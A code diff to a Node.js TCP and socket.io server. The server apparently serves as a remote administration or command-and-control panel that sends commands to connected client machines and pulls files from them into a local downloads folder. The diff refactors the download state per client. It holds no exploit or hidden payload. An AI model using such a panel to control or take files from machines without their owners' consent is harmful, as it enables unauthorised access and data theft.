@@ -162,49 +162,33 @@ function createTcpServer() {
   
   // Buffer for incomplete messages
   let messageBuffer = '';
-  let isDownloading = false;
-  let downloadBuffer = Buffer.alloc(0);
-  let downloadFilename = '';
-  let downloadTimeout = null;
   
   socket.on('data', (data) => {
     try {
-      // Check if we're in download mode (receiving binary data)
-      if (isDownloading) {
-        downloadBuffer = Buffer.concat([downloadBuffer, data]);
-        
-        // Reset timeout when receiving data
-        if (downloadTimeout) {
-          clearTimeout(downloadTimeout);
-        }
-        
-        // Set timeout to complete download after 2 seconds of inactivity
-        downloadTimeout = setTimeout(() => {
-          if (isDownloading && downloadBuffer.length > 0 && downloadFilename) {
-            try {
-              const filename = path.basename(downloadFilename);
-              const downloadPath = path.join('downloads', filename);
-              fs.writeFileSync(downloadPath, downloadBuffer);
-              console.log(`[TCP] File downloaded: ${downloadPath} (${downloadBuffer.length} bytes)`);
-              
-              // Notify GUI clients about successful download
-              io.emit('fileDownloaded', {
-                clientId: clientId,
-                filename: filename,
-                path: downloadPath,
-                size: downloadBuffer.length
-              });
-              
-              // Reset download state
-              isDownloading = false;
-              downloadBuffer = Buffer.alloc(0);
-              downloadFilename = '';
-            } catch (error) {
-              console.error(`[TCP] Error saving downloaded file:`, error);
-            }
+      // If there is a pending download for this client, treat incoming bytes as file data
+      const c = clients.get(clientId);
+      if (c && c.pendingDownload && c.pendingDownload.inProgress) {
+        const pd = c.pendingDownload;
+        pd.buffer = Buffer.concat([pd.buffer || Buffer.alloc(0), data]);
+        if (pd.timeout) clearTimeout(pd.timeout);
+        pd.timeout = setTimeout(() => {
+          try {
+            const filename = path.basename(pd.filename || `download_${Date.now()}`);
+            const downloadPath = path.join('downloads', filename);
+            fs.writeFileSync(downloadPath, pd.buffer || Buffer.alloc(0));
+            console.log(`[TCP] File downloaded: ${downloadPath} (${(pd.buffer||Buffer.alloc(0)).length} bytes)`);
+            io.emit('fileDownloaded', { clientId, filename, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
+            // Also emit a terminal-friendly message
+            io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}`, timestamp: new Date() });
+          } catch (e) {
+            console.error('[TCP] Error saving downloaded file:', e);
+            io.emit('commandResponse', { clientId, response: `Download save failed: ${e.message}`, timestamp: new Date() });
+          } finally {
+            // clear state
+            if (c.pendingDownload && c.pendingDownload.timeout) clearTimeout(c.pendingDownload.timeout);
+            c.pendingDownload = null;
           }
         }, 2000);
-        
         return;
       }
       
@@ -277,12 +261,12 @@ function createTcpServer() {
         if (client) {
           client.lastSeen = new Date();
           
-          // Check if this is a download command response
-          if (message.content && message.content.includes('Download') && message.content.includes('Failed')) {
-            // Download failed, reset download state
-            isDownloading = false;
-            downloadBuffer = Buffer.alloc(0);
-            downloadFilename = '';
+          // If the client reports a failure, clear pending download state
+          if (message.content && message.content.toLowerCase().includes('download') && message.content.toLowerCase().includes('failed')) {
+            if (client.pendingDownload) {
+              if (client.pendingDownload.timeout) clearTimeout(client.pendingDownload.timeout);
+              client.pendingDownload = null;
+            }
           }
           
           // Store in session history
@@ -301,12 +285,6 @@ function createTcpServer() {
             timestamp: new Date()
           });
         }
-      } else if (message.type === 'command' && message.content && message.content.startsWith('download ')) {
-        // Download command received - prepare for file download
-        downloadFilename = message.content.replace('download ', '');
-        isDownloading = true;
-        downloadBuffer = Buffer.alloc(0);
-        console.log(`[TCP] Starting download: ${downloadFilename}`);
       } else if (message.type === 'heartbeat') {
         // Heartbeat response
         const client = clients.get(clientId);
@@ -605,6 +583,14 @@ io.on('connection', (socket) => {
           content: `download ${filename}`
         };
         
+        // mark this client as expecting a download stream
+        client.pendingDownload = {
+          inProgress: true,
+          filename,
+          buffer: Buffer.alloc(0),
+          timeout: null
+        };
+
         client.socket.write(JSON.stringify(commandData));
         socket.emit('downloadInitiated', { clientId, filename });
       } catch (error) {
